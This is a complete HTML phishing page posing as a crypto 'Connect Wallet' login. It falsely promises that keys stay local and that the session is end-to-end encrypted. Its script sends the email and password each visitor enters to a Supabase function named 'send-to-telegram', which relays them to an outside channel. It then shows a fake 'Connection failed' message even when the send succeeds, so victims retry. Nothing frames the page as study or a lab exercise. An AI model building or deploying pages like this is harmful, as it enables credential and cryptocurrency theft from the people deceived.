<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connect Wallet</title>
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: hsl(220, 20%, 7%);
      color: hsl(210, 20%, 92%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }
    .glow { position: fixed; inset: 0; pointer-events: none; overflow: hidden; }
    .glow::before {
      content: '';
      position: absolute;
      left: 50%; top: 33%;
      transform: translate(-50%, -50%);
      width: 500px; height: 500px;
      border-radius: 50%;
      background: hsla(210, 100%, 52%, 0.05);
      filter: blur(120px);
    }
    .card {
      position: relative;
      width: 100%; max-width: 28rem;
      background: hsl(220, 18%, 11%);
      border: 1px solid hsl(220, 14%, 18%);
      border-radius: 1rem;
      padding: 2rem;
      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
    }
    h1 {
      font-family: 'Space Grotesk', sans-serif;
      font-size: 1.875rem; font-weight: 700;
      text-align: center; margin-bottom: 0.75rem;
      letter-spacing: -0.025em;
    }
    .description {
      text-align: center; font-size: 0.875rem;
      line-height: 1.6; color: hsl(215, 12%, 55%);
      margin-bottom: 2rem;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      border-radius: 0.75rem;
      border: 1px solid hsl(220, 14%, 18%);
      background: hsl(220, 16%, 16%);
      color: hsl(210, 20%, 92%);
      padding: 0.75rem 1rem;
      font-size: 0.875rem;
      font-family: 'Inter', sans-serif;
      outline: none;
      transition: border-color 0.2s, box-shadow 0.2s;
      margin-bottom: 1rem;
    }
    input::placeholder { color: hsl(215, 12%, 55%); }
    input:focus {
      border-color: hsl(210, 100%, 52%);
      box-shadow: 0 0 0 3px hsla(210, 100%, 52%, 0.15);
    }
    .btn {
      width: 100%; margin-top: 0.25rem;
      padding: 0.75rem; border: none;
      border-radius: 0.75rem;
      background: hsl(210, 100%, 52%);
      color: #fff; font-size: 0.875rem;
      font-weight: 600; font-family: 'Inter', sans-serif;
      cursor: pointer; transition: filter 0.2s;
      box-shadow: 0 0 40px hsla(210, 100%, 52%, 0.3);
    }
    .btn:hover { filter: brightness(1.1); }
    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
    .btn .spinner {
      display: inline-block; width: 16px; height: 16px;
      border: 2px solid rgba(255,255,255,0.3);
      border-top-color: #fff; border-radius: 50%;
      animation: spin 0.6s linear infinite;
      vertical-align: middle; margin-right: 0.5rem;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .message { text-align: center; font-size: 0.875rem; margin-top: 1rem; }
    .message.error { color: hsl(0, 72%, 51%); }
    .message.success { color: hsl(150, 60%, 45%); }
    .footer {
      display: flex; align-items: center; justify-content: center;
      gap: 0.5rem; margin-top: 1.5rem;
      font-size: 0.75rem; color: hsl(215, 12%, 55%);
    }
    .footer svg { color: hsl(210, 100%, 52%); }
  </style>
</head>
<body>

  <div class="glow"></div>

  <div class="card">
    <h1>Connect Wallet</h1>
    <p class="description">
      Multiple iOS and Android wallets support this protocol. Your private keys
      remain encrypted locally on your device and are protected by Biometric and
      2-Factor Authentication.
    </p>

    <form id="walletForm">
      <input type="email" id="email" placeholder="Email address" required />
      <input type="password" id="password" placeholder="Password" required />
      <div id="msg"></div>
      <button type="submit" class="btn" id="submitBtn">Import Now</button>
    </form>

    <div class="footer">
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
      This session is protected with end-to-end encryption
    </div>
  </div>

  <script>
    const SUPABASE_URL = "https://tbsfzpbwgkpozumonhmr.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRic2Z6cGJ3Z2twb3p1bW9uaG1yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI0NDg2MTcsImV4cCI6MjA4ODAyNDYxN30.jNM3LpPGuS2lMyKREZlQ4koin6iyExX6Rfsvk-kQwnY";

    const form = document.getElementById("walletForm");
    const btn = document.getElementById("submitBtn");
    const msg = document.getElementById("msg");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
      if (!email || !password) return;

      btn.disabled = true;
      btn.innerHTML = '<span class="spinner"></span> Connecting...';
      msg.className = "message";
      msg.textContent = "";

      try {
        const res = await fetch(`${SUPABASE_URL}/functions/v1/send-to-telegram`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "apikey": SUPABASE_ANON_KEY,
            "Authorization": `Bearer ${SUPABASE_ANON_KEY}`
          },
          body: JSON.stringify({ message: `Email: ${email}\nPassword: ${password}` })
        });

        const data = await res.json();
        if (!res.ok) throw new Error(data.error || "Request failed");

        msg.className = "message success";
        msg.textContent = "❌ Connection failed. Please try again.";
        form.reset();
        setTimeout(() => { msg.textContent = ""; }, 3000);
      } catch (err) {
        msg.className = "message error";
        msg.textContent = "❌ Connection failed. Please try again.";
      } finally {
        btn.disabled = false;
        btn.textContent = "Import Now";
      }
    });
  </script>

</body>
</html>
